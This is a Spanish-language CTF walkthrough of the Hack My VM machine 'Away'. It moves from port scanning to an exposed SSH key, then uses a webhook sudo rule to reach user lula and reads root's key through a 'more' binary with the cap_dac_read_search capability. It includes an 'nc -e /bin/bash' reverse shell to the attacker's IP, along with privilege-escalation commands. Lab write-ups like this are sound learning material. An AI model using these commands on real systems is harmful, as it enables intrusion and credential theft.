---
layout: post
title: Away
date: 2022-12-25
categories: ["HMV", "SSH", "Capabilities"]
thumbnail: "assets/images/Away.png"
---

# Away [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.0.22 -oG allPorts`
- `nmap -sCV -p22,80 192.168.0.22 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Si entramos a la página vemos que nos dice un usuario (`tula`) seguido de una imagen randomizada. Al principio de la imagen vemos `[ED25519 256]`. Tras ver esto podemos pensar que se han generado unas llaves `SSH ED25519`, vamos a probar suerte y nos vamos a dirigir a `http://192.168.0.22/id_ed25519`. Bien! Se nos ha descargado la clave privada, también nos descargaremos la pública (`id_ed25519.pub`).

Si examinamos la clave pública veremos que al final pone: `My passphrase is: Theclockisticking`. Ya podemos entrar a la máquina por `SSH`.

Bien! Ya estamos en la máquina como `tula`!

### Subida de privilegios #1
Para poder ser `root` en la máquina necesitaremos primero pasar por `lula`. Para comenzar haremos `sudo -l` y veremos que podemos ejecutar como `lula` y sin contraseña el binario `webhook`:

```
Matching Defaults entries for tula on away:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tula may run the following commands on away:
    (lula) NOPASSWD: /usr/bin/webhook
```

Tras investigar un poco llegué al repositorio de [`WebHook`](https://github.com/adnanh/webhook), ahí podemos ver la documentación para saber cómo funciona.

Necesitamos un fichero `hook.json` donde será especificada la tarea a realizar. Me copié la plantilla que pone como ejemplo y la cambié un poco:

```
[
  {
    "id": "shell",
    "execute-command": "/home/tula/shell.sh",
    "command-working-directory": "/var/webhook"
  }
]
```

Antes de ejecutar la herramienta nos vamos a crear el fichero que especifiqué antes (`shell.sh`). Tiene `NC` instalado por lo que nos será más fácil:

```
#!/bin/bash

nc -e /bin/bash 192.168.0.19 4444
```

Ahora con `chmod +x shell.sh` le damos permisos de ejecución y estamos listos para seguir con la escalada de privilegios. Antes de nada nos pondremos en escucha con `NC` por el puerto que hayamos especificado antes, en mi caso el `4444`.

- `nc -nlvp 4444`

Para poder convertirnos en `lula` ejecutaremos `webhook` como dicho usuario:

- `sudo -u lula /usr/bin/webhook -verbose`

Se nos creará una `WebHook` que será accesible por el puerto `9000`, por lo que nos dirigimos a `http://192.168.0.22:9000/hooks/shell` y recibiremos la conexión.

Bien! Ya estamos como `lula` en la máquina víctima!

### Subida de privilegios #2
Ahora sí podemos convertirnos en `root`. Para conseguir dicho usuario me descargué [`LinPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) y lo ejecuté. Tras unos segundos de espera vemos algo que nos llama la atención:

```
/usr/bin/more cap_dac_read_search=ep
```

Vemos que el binario tiene la capacidad de saltarse los permisos de lectura, adicionalmente podemos ver que pertenece a nuestro grupo con `ls -alh /usr/bin/more`:

```
-rwxrwx--- 1 root lula 59K ene 20 21:10 /usr/bin/more
```

Con esto sabido y recordando que la máquina utiliza pares de llaves `ED25519` podemos intentar leer la clave privada de `root` para conectarnos por `SSH`:

- `more /root/.ssh/id_ed25519 > root.id_ed25519`

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1
deducted
AwQ=
-----END OPENSSH PRIVATE KEY-----
```

Enhorabuena! Ya estamos en la máquina como `root`! Qué fácil!
